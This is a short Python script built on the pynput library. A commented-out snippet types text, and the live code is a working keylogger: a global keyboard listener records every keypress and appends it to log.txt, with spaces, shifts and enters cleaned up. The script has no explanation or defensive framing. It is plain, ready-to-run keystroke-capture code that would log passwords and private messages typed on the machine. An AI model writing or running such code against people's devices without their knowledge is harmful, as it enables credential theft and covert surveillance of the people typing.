# from pynput.keyboard import Controller
# def controlKeyboard():
#     keyboard = Controller()
#     keyboard.type("blah blah")
# controlKeyboard()
from pynput import keyboard
from pynput.keyboard import Listener

def writeToFile(key):
    keyData = str(key)
    keyData = keyData.replace("'","")
    if keyData == 'Key.space':
        keyData = ' '
    if keyData == 'Key.shift_r' or keyData == 'Key.shift':
        keyData = ''
    if keyData == 'Key.enter':
        keyData = '\n'

    with open("log.txt", "a") as a:
        a.write(keyData)


with Listener(on_press=writeToFile) as L:
    L.join()